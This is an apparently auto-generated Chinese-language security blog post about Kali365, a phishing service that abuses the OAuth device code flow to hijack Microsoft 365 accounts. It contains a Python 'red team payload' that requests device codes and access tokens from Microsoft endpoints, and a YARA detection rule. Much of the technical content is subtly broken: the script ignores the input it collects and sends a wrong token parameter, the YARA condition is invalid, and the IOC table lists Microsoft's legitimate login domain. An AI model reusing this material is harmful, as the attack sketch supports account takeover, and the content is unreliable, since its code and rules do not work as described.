---
layout: post
title:  "FBI warns of Kali365 phishing service targeting Microsoft 365 accounts"
date:   2026-05-25 14:41:27 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Kali365 攻擊平台：OAuth Device Code 欺騙技術的應用與防禦

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: Account Takeover (ATO)
> * **關鍵技術**: OAuth 2.0 Device Authorization, Phishing-as-a-Service (PhaaS), Multi-Factor Authentication (MFA) 繞過

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Kali365 攻擊平台利用 OAuth 2.0 Device Authorization grant flow 中的漏洞，通過欺騙用戶輸入 device code，從而獲得 Microsoft 365 帳戶的存取權限。
* **攻擊流程圖解**:
  1. 攻擊者初始化 device authorization 流程，生成 device code。
  2. 攻擊者通過 phishing 或 social engineering 手段，誘導用戶輸入 device code。
  3. 用戶輸入 device code 後，Microsoft 會發放 OAuth access token。
  4. 攻擊者使用獲得的 access token，存取用戶的 Microsoft 365 帳戶。
* **受影響元件**: Microsoft 365、Microsoft Entra

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有 Kali365 攻擊平台的存取權限。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 初始化 device authorization 流程
    device_code_url = "https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/devicecode"
    device_code_response = requests.post(device_code_url, headers={"Content-Type": "application/x-www-form-urlencoded"}, data={"client_id": "your_client_id", "scope": "https://graph.microsoft.com/.default"})
    
    # 獲取 device code
    device_code = device_code_response.json()["device_code"]
    
    #誘導用戶輸入 device code
    print("請輸入 device code：")
    user_input = input()
    
    # 驗證用戶輸入的 device code
    verify_url = "https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token"
    verify_response = requests.post(verify_url, headers={"Content-Type": "application/x-www-form-urlencoded"}, data={"grant_type": "device_code", "code": device_code, "client_id": "your_client_id"})
    
    # 獲取 access token
    access_token = verify_response.json()["access_token"]
    
    ```
* **繞過技術**: Kali365 攻擊平台可以繞過 MFA 驗證，直接獲得 access token。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
|  |  | login.microsoftonline.com |  |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Kali365_Detection {
      meta:
        description = "Kali365 攻擊平台偵測規則"
        author = "Your Name"
      strings:
        $device_code_url = "https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/devicecode"
      condition:
        $device_code_url in (http.request.uri)
    }
    
    ```
* **緩解措施**: 限制或禁止 device code authentication 流程，審計現有的 device code 使用情況，並阻止 authentication transfer 政策。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **OAuth 2.0 Device Authorization**: 一種 OAuth 2.0 授權流程，允許設備以有限的輸入能力進行授權。
* **Phishing-as-a-Service (PhaaS)**: 一種提供 phishing 攻擊平台的服務，允許攻擊者輕鬆地進行 phishing 攻擊。
* **Multi-Factor Authentication (MFA)**: 一種需要多個驗證因素的身份驗證機制，例如密碼、生物特徵、短信驗證碼等。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/fbi-warns-of-kali365-phishing-service-targeting-microsoft-365-accounts/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1114/)


